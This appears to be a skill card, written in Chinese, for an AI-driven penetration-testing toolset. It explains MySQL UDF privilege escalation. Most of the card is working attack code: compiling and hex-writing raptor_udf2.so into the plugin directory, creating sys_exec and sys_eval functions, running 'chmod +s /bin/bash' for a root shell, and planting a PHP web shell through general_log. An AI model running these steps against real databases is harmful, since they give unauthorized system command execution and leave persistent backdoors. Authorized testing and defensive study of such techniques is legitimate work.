---
name: 'mysql-udf-privesc'
description: 'MySQL root → UDF shared library → SYSTEM命令执行。Linux最常见的数据库提权路径之一。'
disable-model-invocation: true
metadata: { domain: db, tier: T2 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

## MySQL UDF (User Defined Function) 提权

> MySQL root 权限 → 加载自定义共享库 → 以 mysql 用户（或 root）执行系统命令

### 检测
```bash
# MySQL 是否以 root 运行
ps aux | grep mysql | grep -v grep
# 检查 secure_file_priv（空 = 可写任意路径）
mysql -u root -p -e "SHOW VARIABLES LIKE 'secure_file_priv';"
# 检查 plugin 目录
mysql -u root -p -e "SHOW VARIABLES LIKE 'plugin_dir';"
# 版本 → 选择对应架构的 .so
mysql -u root -p -e "SELECT @@version_compile_os, @@version_compile_machine;"
```text

### UDF 库准备
```bash
# Kali: 编译 raptor_udf2.c
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 或者使用预编译的（Kali 自带）
cp /usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so .
# 或者
searchsploit -m 1518   # raptor_udf2.c
```text

### 利用
```sql
-- 1. 写 so 到 plugin 目录（二进制写入）
--    本机先 xxd -p raptor_udf2.so | tr -d '\n' 取 hex，再写入：
SELECT 0x<HEX_OF_SO> INTO DUMPFILE '<plugin_dir>/raptor_udf2.so';

-- 2. 创建函数
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- 3. 执行命令
SELECT sys_exec('chmod +s /bin/bash');
SELECT sys_eval('id');

-- 4. （可选）清理
DROP FUNCTION sys_exec;
DROP FUNCTION sys_eval;
```text

### 如果 secure_file_priv 非空
```sql
-- 写文件到允许的路径
SELECT @@secure_file_priv;   -- 如 /var/lib/mysql-files/
-- 注意：plugin_dir 是只读变量，无法 SET GLOBAL 修改；.so 必须写进 plugin_dir 实际路径
-- 或者用 general_log 写文件（需要 FILE 权限）
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SET GLOBAL general_log = ON;
SELECT '<?php system($_GET["c"]);?>';
SET GLOBAL general_log = OFF;
```text

### 版本注意事项
- MySQL < 5.0.67: 直接 SYSTEM 权限
- MySQL >= 5.0.67: UDF 仍然以 mysql 用户运行，需要额外提权
- MariaDB: 大多数版本仍支持，但新版限制了 `plugin_dir` 修改
